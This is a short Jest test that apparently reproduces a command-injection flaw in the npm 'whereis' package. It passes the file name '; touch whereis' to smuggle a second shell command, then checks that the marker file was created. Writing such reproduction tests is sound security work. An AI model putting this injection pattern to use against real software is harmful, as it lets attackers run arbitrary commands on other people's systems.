test("Command Injection in whereis", (done) => {
  expect.assertions(2);
  const whereis = require("whereis");
  const fs = require("fs");
  const path = "./whereis";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let filename = "; touch whereis";
  whereis(filename, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
